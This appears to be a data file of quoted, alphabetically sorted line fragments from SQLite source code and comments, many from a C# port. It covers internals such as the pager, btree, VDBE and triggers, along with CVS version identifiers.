"  nprintf --  No output, but returns the number of characters"
"  pNew = sqlite3DbMallocZero(db, sizeof("
"  pParse = sqlite3StackAllocZero(db, sizeof("
"  pTab = sqlite3FindTable(db, zTab, db->aDb[iDb].zName)"
"  pVTable = sqlite3DbMallocZero(db, sizeof(VTable))"
"  pVtab = sqlite3GetVTable(db, pTab)->pVtab"
"  rc = sqlite3ApiExit(db, SQLITE_OK)"
"  rc = sqlite3ApiExit(db, rc)"
"  rc = xConstruct(db, pMod->pAux, nArg, azArg, "
"  return createModule(db, zName, pModule, pAux, 0)"
"  return createModule(db, zName, pModule, pAux, xDestroy)"
"  return sqlite3_value_numeric_type( columnMem(pStmt,i) )"
"  snprintf -- Works like sprintf, but has an extra argument"
"  sqlite3DbFree(db, zModuleName)"
"  sqlite3StartTable(pParse, pName1, pName2, 0, 0, 1, 0)"
"  sqlite3VdbeMemGrow(pMem, n, 0)"
"  sqlite3_exec(db, zSQL, 0, 0, 0)"
"  sqlite3_test_control(BENIGN_MALLOC_HOOKS, xBegin, xEnd)"
"  sqlite3_test_control(BITVEC_TEST, size, program)"
"  sqlite3_test_control(SQLITE_TESTCTRL_ALWAYS, int X)"
"  sqlite3_test_control(SQLITE_TESTCTRL_ASSERT, int X)"
"  sqlite3_test_control(SQLITE_TESTCTRL_PENDING_BYTE, unsigned int X)"
"  vtabDisconnectAll(0, p)"
"  yy_reduce_ofst[]   For each state, the offset into yy_action for"
"  yy_shift_ofst[]    For each state, the offset into yy_action for"
"  zLowerName = sqlite3DbStrDup(db, pDef->zName)"
" !( Double.TryParse( Convert.ToString( realvalue ), out d ) ) )//if( sqlite3IsNaN((double)realvalue) )"
" !DbHasProperty( db, 1, DB_SchemaLoaded ) )"
" !ExprHasAnyProperty( pExpr, EP_TokenOnly ) )"
" !ExprHasAnyProperty( pX, EP_xIsSelect ) )"
" !hasReadConflicts(p, (u32)iTable))"
" !referencesOtherTables( pOrderBy, pMaskSet, 1, _base ) )"
" !referencesOtherTables( pOrderBy, pMaskSet, j, _base ) )"
" !sortableByRowid( iCur, pOrderBy, pWC.pMaskSet, ref rev ) ) )"
" !sqlite3ExprCompare( pSrc.pCheck, pDest.pCheck ) )"
" !sqlite3GetInt32( zRight, ref iLimit ) "
" !winceCreateLock(zName, pFile)"
" "" """
" "" )"
" "" are not unique"" : "" is not unique"", -1 )"
" "" handed to x_count"", -1 )"
" ""!"" )"
" """" : "" UNIQUE"","
" """" : bResult"
" """" : p.zErrMsg, SQLITE_UTF8, SQLITE_TRANSIENT )"
" """" : pOp.p4.z"
" """" : pParse.zTail.ToString()"
" """" : sqlite3MPrintf( db, ""-%T"", pValue )"
" """" : z.Substring( p1, p2 ), (int)p2, SQLITE_TRANSIENT )"
" """" : z2.Substring( 0, n ).ToLower()"
" """" : z2.Substring(0, n).ToUpper(), -1, null)"
" """" : zSql.Substring( i, zSql.Length - i ) )"
" ""'"" )"
" ""'"")"
" "")"")"
" "", 2)"
" ""-"" "
" ""-journal"""
" "". Error 0x"" "
" "". Error: 0x"" "
" ""./"" to avoid ambiguity."
" "".0"""
" ""0"" digits after the decimal point but before the first"
" "":memory:"" databases and when the journal_mode=MEMORY pragma is used."
" ""="", ""<"", "">"", ""<="", "">="", and ""IN""."
" ""ALTER TABLE RENAME TO"" statement."
" ""BEFORE"" : ""AFTER"", pTableName, 0 )"
" ""BusyHandler"" typedefs. vdbe.h also requires a few of the opaque"
" ""CREATE TABLE ... AS SELECT ..."" statement.  The column names of"
" ""CREATE TRIGGER ... ON ON.ON BEGIN ..."" etc."
" ""Cancel"" button on a GUI progress dialog box."
" ""DROP TABLE"" statements and to prevent some nasty side effects of"
" ""Expanding"" means to do the following:"
" ""GROUP"" or ""ORDER"" or """" "
" ""LIMIT -1"" always shows all rows.  There is some"
" ""MUST BE FIRST"" for this purpose."
" ""Managed"" code needs this.  Ticket "
" ""NULL"
" ""NULL"".  Otherwise, the argument is enclosed in single quotes with"
" ""ON"" : ""USING"" )"
" ""OP_Destroy 4 0"" opcode. The subsequent ""OP_Destroy 5 0"" would hit"
" ""ORDER"" or ""GROUP"" "
" ""ORDER"" or ""GROUP"" depending on which type of clause pOrderBy is."
" ""Owner"" connection. See comment above "
" ""PRAGMA encoding = XXX"" "
" ""PRAGMA encoding"" "
" ""SELECT"" statement. The meanings of the other members is determined by the"
" ""SRT"" prefix means ""SELECT Result Type""."
" ""Select Flag""."
" ""T.C <op> <expr>"" where C is any column of table T and"
" ""VIEW"" or ""TABLE"" "
" ""Verification, Validation, and Accreditation"".  In other words, the"
" ""X collate NOCASE op Y"". This is because any collation sequence on"
" ""[a-z]"" matches any single lower-case letter.  To match a '-', make"
" ""]"""
" ""a"" we substitute ""x"
" ""a-b-c""."
" ""amt"" bytes will be transfered into pBuf[].  The transfer"
" ""binding Integer ["" "
" ""binding Long ["" "
" ""binding Text ["" "
" ""cannot rollback - no transaction is active"" :"
" ""cannot start a transaction within a transaction"" : ("
" ""columns "" : ""column """
" ""committing"" a read-only transaction cannot fail."
" ""compiled SQL statement"" or simply as a ""statement""."
" ""experimental"".  Experimental interfaces are normally new"
" ""glob(B,A).  We want to use the A in ""A glob B"" to test"
" ""halt"" opcode and causes the test to end."
" ""if( isDirect )"" condition."
" ""incremental"", write the value of meta[6] in the database"
" ""is journaled"" bitvec flag has been set. This needs to be remedied by"
" ""length"" characters long.  The field width is ""width"".  Do"
" ""like"" or ""glob"" or ""regexp"" "
" ""main-journal"" : ""sub-journal"" )"
" ""min"" : ""max"" ) )"
" ""no such column"" : ""ambiguous column name"""
" ""no such page"".  The page size can be anything between 512 and 65536."
" ""no such view"" : ""no such table"""
" ""orphaned trigger"" - a trigger whose associated table is missing."
" ""os.c"") attempt to abstract the underlying operating system so that"
" ""overwrite"" : ""new entry"")"
" ""p"" points to the right-most of the two queries.  the query on the"
" ""pExpr"" field filled in.  The job of this routine is to analyze the"
" ""pNew"" is a pointer to the hash table that is to be initialized."
" ""pTriggerStack"" member of the Parse structure."
" ""rollback"" : ""release"" )"
" ""rowid""]. The rowid is always available"
" ""sql = CASE "" "
" ""sqlite3ParserAlloc"" which describes the current state of the parser."
" ""sqlite_"" (in upper, lower or mixed case). This portion of the namespace"
" ""sqlite_master"" or ""sqlite_temp_master"" table on the disk."
" ""sz"" must be the number of bytes in the cell."
" ""sz"" parameter to [SQLITE_CONFIG_SCRATCH]) and because no scratch buffer"
" ""table.column=expr"" for some single table.  The one bit that is set"
" ""tbl_name = %Q, "" "
" ""temp"" or the name of an attached db). This routine returns the"
" ""transaction savepoint"". "
" ""view"" or ""table"" "
" ""view"", ""trigger"", or ""index"" "
" ""x IN (...)"" expression must be either 0 or NULL. If the set"
" ""yymajor"" is the symbol code, and ""yypminor"" is a pointer to"
" ""}"", """" )"
" $Id: alter.c,v 1.62 2009/07/24 17:58:53 danielk1977 Exp $"
" $Id: attach.c,v 1.93 2009/05/31 21:21:41 drh Exp $"
" $Id: auth.c,v 1.32 2009/07/02 18:40:35 danielk1977 Exp $"
" $Id: backup.c,v 1.19 2009/07/06 19:03:13 drh Exp $"
" $Id: btmutex.c,v 1.17 2009/07/20 12:33:33 drh Exp $"
" $Id: btree.c,v 1.705 2009/08/10 03:57:58 shane Exp $"
" $Id: btreeInt.h,v 1.52 2009/07/15 17:25:46 drh Exp $"
" $Id: build.c,v 1.557 2009/07/24 17:58:53 danielk1977 Exp $"
" $Id: callback.c,v 1.42 2009/06/17 00:35:31 drh Exp $"
" $Id: complete.c,v 1.8 2009/04/28 04:46:42 drh Exp $"
" $Id: date.c,v 1.107 2009/05/03 20:23:53 drh Exp $"
" $Id: delete.c,v 1.207 2009/08/08 18:01:08 drh Exp $"
" $Id: expr.c,v 1.448 2009/07/27 10:05:05 danielk1977 Exp $"
" $Id: fault.c,v 1.11 2008/09/02 00:52:52 drh Exp $"
" $Id: func.c,v 1.239 2009/06/19 16:44:41 drh Exp $"
" $Id: global.c,v 1.12 2009/02/05 16:31:46 drh Exp $"
" $Id: hash.c,v 1.38 2009/05/09 23:29:12 drh Exp"
" $Id: hash.h,v 1.15 2009/05/02 13:29:38 drh Exp $"
" $Id: hwtime.h,v 1.3 2008/08/01 14:33:15 shane Exp $"
" $Id: insert.c,v 1.270 2009/07/24 17:58:53 danielk1977 Exp $"
" $Id: legacy.c,v 1.35 2009/08/07 16:56:00 danielk1977 Exp $"
" $Id: loadext.c,v 1.60 2009/06/03 01:24:54 drh Exp $"
" $Id: main.c,v 1.562 2009/07/20 11:32:03 drh Exp $"
" $Id: malloc.c,v 1.66 2009/07/17 11:44:07 drh Exp $"
" $Id: mem0.c,v 1.1 2008/10/28 18:58:20 drh Exp $"
" $Id: mem1.c,v 1.30 2009/03/23 04:33:33 danielk1977 Exp $"
" $Id: mutex.c,v 1.31 2009/07/16 18:21:18 drh Exp $"
" $Id: mutex.h,v 1.9 2008/10/07 15:25:48 drh Exp $"
" $Id: mutex_noop.c,v 1.3 2008/12/05 17:17:08 drh Exp $"
" $Id: mutex_w32.c,v 1.18 2009/08/10 03:23:21 shane Exp $"
" $Id: notify.c,v 1.4 2009/04/07 22:06:57 drh Exp $"
" $Id: os.c,v 1.127 2009/07/27 11:41:21 danielk1977 Exp $"
" $Id: os.h,v 1.108 2009/02/05 16:31:46 drh Exp $"
" $Id: os_common.h,v 1.38 2009/02/24 18:40:50 danielk1977 Exp $"
" $Id: os_win.c,v 1.157 2009/08/05 04:08:30 shane Exp $"
" $Id: pragma.c,v 1.214 2009/07/02 07:47:33 danielk1977 Exp $"
" $Id: prepare.c,v 1.131 2009/08/06 17:43:31 drh Exp $"
" $Id: printf.c,v 1.104 2009/06/03 01:24:54 drh Exp $"
" $Id: random.c,v 1.29 2008/12/10 19:26:24 drh Exp $"
" $Id: resolve.c,v 1.30 2009/06/15 23:15:59 drh Exp $"
" $Id: rowset.c,v 1.7 2009/05/22 01:00:13 drh Exp $"
" $Id: select.c,v 1.526 2009/08/01 15:09:58 drh Exp $"
" $Id: status.c,v 1.9 2008/09/02 00:52:52 drh Exp $"
" $Id: table.c,v 1.39 2009/01/19 20:49:10 drh Exp $"
" $Id: tokenize.c,v 1.163 2009/07/03 22:54:37 drh Exp $"
" $Id: trigger.c,v 1.143 2009/08/10 03:57:58 shane Exp $"
" $Id: update.c,v 1.207 2009/08/08 18:01:08 drh Exp $"
" $Id: utf.c,v 1.73 2009/04/01 18:40:32 drh Exp $"
" $Id: util.c,v 1.262 2009/07/28 16:44:26 danielk1977 Exp $"
" $Id: vacuum.c,v 1.91 2009/07/02 07:47:33 danielk1977 Exp $"
" $Id: vdbe.c,v 1.874 2009/07/24 17:58:53 danielk1977 Exp $"
" $Id: vdbe.h,v 1.142 2009/07/24 17:58:53 danielk1977 Exp $"
" $Id: vdbeInt.h,v 1.174 2009/06/23 14:15:04 drh Exp $"
" $Id: vdbeapi.c,v 1.167 2009/06/25 01:47:12 drh Exp $"
" $Id: vdbeaux.c,v 1.480 2009/08/08 18:01:08 drh Exp $"
" $Id: vdbeblob.c,v 1.35 2009/07/02 07:47:33 danielk1977 Exp $"
" $Id: vdbemem.c,v 1.152 2009/07/22 18:07:41 drh Exp $"
" $Id: vtab.c,v 1.94 2009/08/08 18:01:08 drh Exp $"
" $Id: walker.c,v 1.7 2009/06/15 23:15:59 drh Exp $"
" $Id: where.c,v 1.411 2009/07/31 06:14:52 danielk1977 Exp $"
" %r -> 1st, 2nd, 3rd, 4th, etc.  English only "
" %r . 1st, 2nd, 3rd, 4th, etc.  English only "
" '""' : '"
" ', ' "
" 'NONE'. If there is a type specified, then sqlite3AddColumnType() will"
" 'desiredEnc', one of SQLITE_UTF8, SQLITE_UTF16LE or SQLITE_UTF16BE."
" 'isDirect' below, as well as the block enclosed in the"
" 'x' nor the SELECT... statement are columns, then numeric affinity"
" ( 0 != ( rc = sqlite3OsFileSize( pPager.fd, ref n ) ) ) )"
" ( 0 != ( rc = sqlite3OsWrite( pPager.jfd, Encoding.UTF8.GetBytes( zMaster ), nMaster, iHdrOff "
" ( 0 != ( rc = sqlite3OsWrite( pPager.jfd, aJournalMagic, 8, iHdrOff "
" ( 0 != ( rc = write32bits( pPager.jfd, iHdrOff "
" ( k = addAggInfoColumn( pParse.db, pAggInfo ) ) >= 0"
" ( pOp = sqlite3VdbeGetOp( v, -1 ) ).opcode == OP_Variable"
" ( rc = sqlite3BitvecSet( pDone, pgno ) ) != SQLITE_OK )"
" ( rc = sqlite3BtreeUpdateMeta( p.pDest, 1, p.iDestSchema "
" ( sqlite3FindCollSeq( db, ENC( db ), pIdx.azColl[0], 0 ) == pReq )"
" ( zName = pEList.a[i].zName ) != """" )"
" ("":SS.FFF"") is option.  The year and date can be omitted as long"
" (Bit 0 is for main, bit 1 is for temp, and so forth.)  Bits are"
" (E) above is indexable on tables P, Q, and R."
" (Exception: indices, triggers, and views in the TEMP database are"
" (Later):  Actually, OP_NewRowid does not depend on a good source of"
" (Later:) I tried setting ""PRAGMA vacuum_db.journal_mode=OFF"" but"
" (Pager.nSavepoint-1), then this function is a no-op."
" (Sleep(100), 1) )"
" (The ""_LIMIT_"" in the name is changed to ""_MAX_"".)"
" (b) how many database files have open write transactions, not"
" (b) when P4==-1 there is no need to insert the value, as it will"
" (byte)1 : (byte)0, pTab.zName )"
" (delete, truncate or zero the first part of) the journal file (or"
" (dxStress)pagerStress : null, pPager, pPager.pPCache)"
" (example:  ""a IN (SELECT "
" (hereafter ""the page"") and up to 2 siblings so that all pages have about the"
" (i.e. ""main"", ""temp"" or an attached database) containing the specified"
" (if applicable), and the copies of the p->pLeft and p->pRight expressions,"
" (it must be, as it was just reconstructed using assemblePage()). This"
" (note1) Actually, if we know in advance that (A) is always the same"
" (pKey, nKey))."
" (pc = get2byte(data, addr)) > 0"
" (rc = WriteFile(pFile.fs.Name, pBuf, amt, wrote, 0))!=0"
" (rc = btreeGetPage(pBt, iPage, ref pPage, 0)))"
" (re)initialize the parser, if necessary "
" (see btreeParseCellPtr(), 4 bytes is the minimum size of"
" (sqlite3Malloc() is used to allocate memory), SQLITE_CANTOPEN or"
" (sqlite3StrICmp(zLeft, ""hexkey"")==0 "
" (sqliteMallocRaw), it is not possible to use conditional compilation."
" (there are two of them, the main journal and the sub-journal). This"
" )             //if (memcmp(pPager.dbFileVers, dbFileVers, dbFileVers).Length != 0)"
" ), "
" )//, p"
" )//, pAndTerm"
" )//, pArg"
" )//, pC"
" )//, pCol"
" )//, pDb"
" )//, pFrom"
" )//, pItem"
" )//, pLevel"
" )//, pOp"
" )//, pRec"
" )//, pTabItem"
" )//, pTerm"
" )//p=pParse.aColCache..., p"
" - 4 bytes: Number of records in journal, or -1 no-sync mode is on."
" -DSQLITE_FILE_HEADER=""..."" on the compiler command-line.  The"
" //        pCell = findCell( pPage, i )"
" //     res = UnlockFile(pFilE.h, SHARED_FIRST, 0, SHARED_SIZE, 0)"
" //    res = UnlockFile(pFilE.h, SHARED_FIRST "
" // SetFilePointer(pFile.fs.Name, lowerBits, upperBits, FILE_BEGIN)"
" // TODO --                      fprintf(yyTraceFILE,""%sDiscard input token %s"
" // TODO --            fprintf(yyTraceFILE, ""%sSyntax Error!"
" // TODO --        fprintf(yyTraceFILE, ""%sFail!"
" // TODO --//va_arg(ap, sqlite3_mem_methods"
" // TODO --pNew =  sqlite3GlobalConfig.m.xRealloc(ref pOld, nBytes)"
" // TODO --sqlite3GlobalConfig.pcache = (sqlite3_pcache_methods)va_arg(ap, ""sqlite3_pcache_methods"")"
" // UnlockFile(pFilE.h, SHARED_FIRST, 0, SHARED_SIZE, 0)"
" // if (!ReadFile(pFile.fs.Name, pBuf, amt, got, 0))"
" // memset(pFile, 0, sizeof("
" // memset(pPayload, 0, n)"
" // memset(sNC, 0, sNC).Length"
" // sqlite3DbMallocRaw(db, Index"
" // sqlite3Utf8CharLen(zName, nName)"
" // was  //sqlite3DbFree(db,ref  pFile)"
" //, 1) )"
" //TESTONLY( rc = ) addToSavepointBitvecs(pPager, pgno)"
" //btreeParseCellPtr( pPage, pCell, info )"
" //c = sqlite3VdbeRecordCompare( nCell, (void"
" //contextMalloc( context, n )"
" //insertCell( pPage, iCellIdx, pCell - 4, nCell "
" //memcpy( data[addr], ref data[pc], 2 )"
" //memcpy( zOut, pChunk.zChunk[iChunkOffset], nCopy )"
" //memcpy(pBest.zName, zName, nName)"
" //memcpy(pColl, pColl2, sizeof(CollSeq))"
" //memcpy(pExpr, pDup, sizeof("
" //memcpy(pPager.dbFileVers, ((u8"
" //memset(dbFileVers, 0, dbFileVers).Length"
" //memset(pDest, 0, N)"
" //memset(yygotominor, 0, yygotominor).Length"
" //pCell = findCell( pPage, i )"
" //pCell = findCell( pPage, pPage.nCell - 1 )"
" //put2byte( data, hdr "
" //putVarint( pCell[nHeader], "
" //putVarint( pCell[nHeader], nData "
" //sqlite3DbFree( db, ref pTable.aCol )"
" //sqlite3DbMallocSize(db, pNew)/szEntry"
" //sqlite3DbMallocZero(db, 3"
" //sqlite3DbReallocOrFree(db, pParse.aAlias,"
" //sqlite3GlobalConfig.pcache = (sqlite3_pcache_methods)va_arg(ap, ""sqlite3_pcache_methods"")"
" //sqlite3_snprintf(nByte, pMem.z, ""%lld"", pMem->u.i)"
" //storeTypeInfo(pMem[i], encoding)"
" //strcmp(zVfs, pVfs.zName) == null) break"
" //was  //sqlite3DbFree(db,ref  pDel)"
" 0 -> copy from page, 1 -> copy to page "
" 0 . copy from page, 1 . copy to page "
" 0 : pParse.zTail.Length ) ), saveSqlFlag )"
" 0 == memcmp( aMagic, aJournalMagic, 8 ) )"
" 0 == sqlite3BitvecTest( p.pInSavepoint, pgno ) )"
" 0 == sqlite3StrICmp( pTrig.table, pTab.zName )"
" 0 == sqlite3StrNICmp( pTab.zName, ""sqlite_"", 7 )"
" 0 == sqlite3StrNICmp( zName, ""sqlite_"", 7 ) )"
" 0 == sqlite3StrNICmp( zText.ToString(), aOffset[i], z.Substring( iOffset, n ), n ) )"
" 0 for main database.  1 for TEMP, 2.. for ATTACHed "
" 0.0 in that case.  In addition, TOTAL always returns a float where"
" 0: Not a match, or if nArg<0 and the function is has no implementation."
" 0=Monday, 1=Tuesday, ... 6=Sunday "
" 0xf : 0xff ),"
" 1 : 0 ), 4 )"
" 1 : 0 ), pager_pagehash( pPg ) )"
" 1 : 0 ), regR )"
" 1 : 0, 2))"
" 1 : 0, 3 )"
" 1 : 0, 6 )"
" 1 : 0, iDb )"
" 1 : 0, nColumn )"
" 1 : 0, pgno )"
" 1 : 0, ref pRes)"
" 1 : 0, wrFlag "
" 1 : getVarint32( aKey1, 0, ref szHdr1 ) )"
" 1 : getVarint32( aKey1, idx1, ref serial_type1 ) )"
" 1 : p.iLimit,"
" 1 : sqlite3GetToken( zSql, zCsr, ref token )"
" 1 for DESC, 0 for ASC on the i-th index term "
" 1)].pCell, 0, apCell[nCell], 0, szCell[nCell])"
" 1)].pCell, 0, pCell, 0, pCell.Length < pPage.aOvfl[-(iCell "
" 1, ""rowid "", SQLITE_STATIC )"
" 1, 0 )"
" 1, 0, j1 "
" 1, 0, pIdx.zName, 0 )"
" 1, 0,"
" 1, 1 )"
" 1, 4)"
" 1, SQLITE_JUMPIFNULL )"
" 1, aRegIdx[iCur] )"
" 1, aRegIdx[i] )"
" 1, addr "
" 1, addrSetAbort )"
" 1, atoi( zRight ) )"
" 1, c1 FROM t1"
" 1, expected, iFirst)"
" 1, get2byte(data, pbegin))"
" 1, iCookie )"
" 1, iDb )"
" 1, j "
" 1, k, pTrunk.pgno, n - 1)"
" 1, nResult )"
" 1, pEList.nExpr )"
" 1, pIdx )"
" 1, pIdx.tnum, iDb,"
" 1, pIdxKey)"
" 1, pIn.nMem )"
" 1, pIn.nMem,"
" 1, pTmpSpace )"
" 1, pTrigger.name, 0 )"
" 1, parent)"
" 1, r1 )"
" 1, ref meta[i] )"
" 1, regOut )"
" 1, regRow )"
" 1, regTemp )"
" 1, regTemp, regTemp )"
" 1, zTmpname )"
" 1. In the ""trigHash"" hash table (part of the sqlite3"
" 12, pPager.sectorSize )"
" 12, ref pPager.cksumInit ) )"
" 16, (u32)pPager.pageSize )"
" 16, ref pDbSize ) )"
" 17 bytes long, 0 to N bytes of payload, and an optional 4 byte overflow"
" 1: 0, 2: 1, 3: 2,...  N:  N-1. "
" 1], ref data[pbegin], 2 )"
" 1].pExpr, target )"
" 2, ""ok"", P4_STATIC )"
" 2, ( pOut == pIn2 ) "
" 2, 0 ) ) )"
" 2, 0, 3 )"
" 2, 0,"
" 2, 1 ) != 0 )"
" 2, data, ptr, (pPage.nCell - 1 - idx) "
" 2, iAddr "
" 2, iContinue, j2 "
" 2, iCookie )"
" 2, iDb )"
" 2, null)"
" 2, pIdxKey)"
" 2, regRecord )"
" 2, size)"
" 2, x)"
" 2. All triggers associated with a single table form a linked list, using the"
" 2. If the triggers being coded are ON INSERT or ON UPDATE triggers, then"
" 20, (int)nHeader - ( aJournalMagic.Length "
" 20, ref iSectorSize ) )"
" 20..27     !"""
" 2006-10-31:  The default prefix used to be ""sqlite_"".  But then"
" 2008-04-14:  When attempting to vacuum a corrupt database file, it"
" 24, ref iPageSize ) )"
" 3 - pFunc.nArg, regArgs "
" 3, "" missing from index "", SQLITE_STATIC )"
" 3, addr "
" 3, j "
" 3, nCell)"
" 3, pPage.nCell )"
" 3, pPage.nCell)"
" 3. If the triggers being coded are ON DELETE or ON UPDATE triggers, then"
" 3.6.0, databases with freelist trunk pages holding more than"
" 32-bit integer is an atomic operation.  If that assumption is not true,"
" 32-bit numbers.  At that time, it was much faster than the"
" 4 bytes: N (length of master journal name in bytes, no nul-terminator)."
" 4), aData, 8 "
" 4, ""trigger"", P4_STATIC )"
" 4, 4)"
" 4, cksum ) ) )"
" 4, eAuto - 1 )"
" 4, iMeta)"
" 4, iPage)"
" 4, null, n, ref rc)"
" 4, pBt.autoVacuum "
" 4, pBt.incrVacuum "
" 4, pBuf, pBufOffset, (u32)a, eOp, pDbPage)"
" 4, pIdx.zName, P4_STATIC )"
" 4, pPager.cksumInit )"
" 4, pTmp, n, ref rc )"
" 4: ""trigger"" "
" 4], 4 )"
" 4], ref aData[4 "
" 5 and 500 set operations per Bitvec object, though the number of sets can"
" 5, cbrk)"
" 5, cellbody)"
" 5, iDb )"
" 5, pBt.usableSize)"
" 5, top)"
" 57.5, 73.4.  Or one of 719 other combinations might be used. It"
" 6, SQLITE_DEFAULT_CACHE_SIZE )"
" 6, zPrefix )"
" 64-bit signed integer, return TRUE.  Otherwise return FALSE."
" 7, memId )"
" 7, pIdx.zName, P4_STATIC )"
" 7], iPage)"
" 8, """" )"
" 8, iTo)"
" 8, pPager.dbOrigSize )"
" 8, pgnoChild)"
" 8, pgnoNew)"
" 8, ref pNRec ) )"
" <a href=""/cvstrac/wiki"
" <a href=""lang_attach.html"">ATTACH</a> SQL command that opened the"
" <b>Goofy Interface Alert:</b> In the legacy interface, the sqlite3_step()"
" <b>The ""DROP TABLE"" Exception</b>"
" <b>sqlite3_backup_remaining(), sqlite3_backup_pagecount()</b>"
" <dd>The database is opened for reading and writing if possible, or reading"
" <dd>The database is opened for reading and writing, and is creates it if"
" <dd>This option takes single argument of type int, interpreted as a "
" <li> [SQLITE_LOCK_NONE],"
" <li> [SQLITE_LOCK_PENDING], or"
" <li> [SQLITE_LOCK_RESERVED],"
" <li> [SQLITE_LOCK_SHARED],"
" <op> is one of ""="", ""<"", ""<="", "">"", "">="", ""IS NULL"", or ""IN""."
" <operator> is one of UNION ALL, UNION, EXCEPT, or INTERSECT.  The idea"
" <table border=""1"">"
" <tbl> is returned. Otherwise, 0 is returned."
" A ""Collating Sequence"" is defined by an instance of the following"
" A ""NOT INDEXED"" clause was supplied. See parse.y"
" A ""row change"" is a change to a single row of a single table"
" A ""trigger context"" is a scope of execution that begins and"
" A 'page', in this context, is a buffer of szPage bytes aligned at an"
" A 3-byte varint is sufficient, for example, to record the size"
" A Context stores the last insert rowid, the last statement change count,"
" A MACRO version, getVarint32, is provided which inlines the"
" A SrcList is returned, or NULL if there is an OOM error.  The returned"
" A and B and the USING clause names X, Y, and Z, then add this"
" A call to sqlite3_initialize() is an ""effective"" call if it is"
" A call to sqlite3_shutdown() is an ""effective"" call if it is the first"
" A commit in auto_vacuum=""full"" mode,"
" A copy of pExpr is used instead of the original, as pExpr contains"
" A foreign key is associated with two tables.  The ""from"" table is"
" A like pattern of the form ""x LIKE 'abc%'"" is changed into constraints"
" A new IdList is returned, or NULL if malloc() fails."
" A shared-cache write-lock is not required to write to the new table,"
" A single VDBE is an opaque structure named ""Vdbe"".  Only routines"
" A subterm is ""indexable"" if it is of the form"
" A total of ""amt"" bytes are read or written beginning at ""offset""."
" A's transaction is concluded. Indirect deadlock is also detected, so"
" AGGREGATE(count,             0, 0, 0, countStep,       countFinalize  ), "
" ALWAYS() and NEVER() are both no-op pass-through macros, which is the"
" ALWAYS(sqlite3GetVTable(db, pTab)) ){"
" API always returns a generic error code, [SQLITE_ERROR], following any"
" API.  The SQLITE_OPEN_EXCLUSIVE flag, when paired with the "
" Access routines.  To delete, insert a NULL pointer."
" Actually, the error above is now caught prior to reaching this point."
" Add ""0"" or ""0x"" "
" Add the ""eNNN"" suffix "
" Add the ON clause to the end of the WHERE clause, connected by"
" Add the page to the global LRU list. Normally, the page is added to"
" Additionally, an instance of this structure can be used as an"
" Advance zCsr to the next token. Store that token type in 'token',"
" After a database is initialized, the DB_SchemaLoaded bit is set"
" After all inserts are finished, it is possible to extract the"
" After all pages have been released using sqlite_page_unref(),"
" After seeking the cursor, the vdbe executes an OP_ResultRow."
" After the VDBE has be prepped, it can be executed by one or more"
" After the call above it would contain:  A, B, nil, nil, nil."
" After the calling function has finished using the result, it should"
" After the journal is finalized, if running in non-exclusive mode, the"
" After the records are added to the journal (and the journal synced,"
" After this routine has been called, the sqlite3RowSetInsert()"
" After this routine has finished, sqlite3VdbeFinalize() should be"
" After this routine is run, the VDBE should be ready to be executed"
" Again, this structure is intended to be opaque, but it can't really"
" All files and directories have already been synced, so the following"
" All of the usual printf() formatting options apply.  In addition, there"
" Allocate a new buffer using sqlite3Malloc. Before doing so, exit the"
" Allocate and zero memory.  If the allocation fails, make"
" Allocate memory for the Pager structure, PCache object, the"
" Allocate registers for holding the rowid of the new row,"
" Allocate space for memory registers, SQL variables, VDBE cursors and"
" Allocated size of apCell, szCell, aFrom. "
" Allowed values for Select.selFlags.  The ""SF"" prefix stands for"
" Also make a copy of the expression results into another ""cache"" register"
" Also, collation destructor - CollSeq.xDel() - function may need"
" Also, do not write out any page that has the PGHDR_DONT_WRITE flag"
" Also, implement the pragma."
" Also, set the cursor state to invalid. This stops saveCursorPosition()"
" Also, the old data is needed to delete the old index entries."
" Also, the sqlite3.dfltJournalMode variable is set so that"
" Also, the sqlite3.dfltLockMode variable is set so that"
" Also, whether or not P4 is set, check that this is not being called from"
" Among other things, sqlite3_initialize() shall invoke"
" An ""etByte"" is an 8-bit unsigned value."
" An ORDER BY clause, or NULL "
" An entry for the table is made in the master table on disk, unless"
" An error code is returned if something goes wrong, otherwise SQLITE_OK."
" An incremental vacuum,"
" An instance of this structure can hold a simple list of identifiers,"
" An instance of this structure is used to store the LIKE,"
" An sqlite3_value object may be either ""protected"" or ""unprotected""."
" Any corruption is detected in sqlite3BtreeParseCellPtr(), though, so"
" Any quotation marks (ex:  ""name"", 'name', [name], or "
" Apart from that, we have little to go on besides intuition as to"
" Argument pRight (but not pLeft) may be a null pointer. In this case,"
" Array of size Index.nColumn. True==DESC, False==ASC "
" As a result, a sqlite3.pDisconnect cannot be accessed simultaneously "
" As a special case, all 8 bytes of the 9th byte are used as data.  This"
" As an example of the result table format, suppose a query result"
" As before, subsequent error messages are suppressed until"
" As each page of the file is loaded into memory, an instance of the following"
" As long as the buffer size is greater than zero, sqlite3_snprintf()"
" As more of the CREATE TABLE statement is parsed, additional action"
" As with all other SQLite APIs, those postfixed with ""16"" return"
" Assuming the current time value is UTC (a.k.a. GMT), shift it to"
" Assuming the record contains N fields, the record format looks"
" Assuming zIn points to the first byte of a UTF-8 character,"
" At the end of the CREATE TABLE statement, the sqlite3EndTable() routine"
" At the end of this call, the rollback journal still exists on the"
" At the first match, the ORDER BY expression is transformed into"
" At the pager level, a statement transaction is a savepoint with"
" At the point this routine is called, we already know that the"
" At this point, nFree contains the sum of the offset to the start"
" At this point, okToChngToIN is true if original pTerm satisfies"
" At this point, the sqlite3_index_info structure that pIdxInfo points"
" At this point, unless the main db was completely empty, there is now a"
" At this point, variables are initialized as follows:"
" Attempt to reallocate p.  If the reallocation fails, then free p"
" Auxilary data, if created. "
" Balance the tree. If the entry deleted was located on a leaf page,"
" Be sure to delete p.pOrderBy, therefore, to avoid a memory leak. "
" Because no reference was made to outer contexts, the pNC.nRef"
" Because the %q format string is used, the '"
" Because the intermediate RESERVED lock is not requested, any"
" Because the parser constructs pTblName from a single identifier,"
" Because we do not completely understand the problem, we will"
" Before a nested trigger is coded, the linked list pointed to by the"
" Before doing anything else, call the xSync() callback for any"
" Before doing anything else, take a copy of the i'th original sibling"
" Before returning, all pointer-map entries corresponding to pages"
" Before returning, page pTo is reinitialized using btreeInitPage()."
" Begin by filling registers 2, 3, ... with the root pages numbers"
" Besides the payload, the cell must store:"
" Black magic: If the SQLITE_RecoveryMode flag is set, then consider"
" Boolean. While true, do not spill the cache "
" BtCursor.info structure.  If it is not already valid, call"
" Buffer.BlockCopy( z, 0, pMem.z, 0, (int)nAlloc )"
" Busy handler timeout, in msec "
" But because db.init.busy is set to 1, no VDBE code is generated"
" But by using this automatically generated code, the size of the code"
" But if the soft heap limit cannot be honored, execution will"
" But if the table is the right table of a left join, WhereLevel.wsFlags"
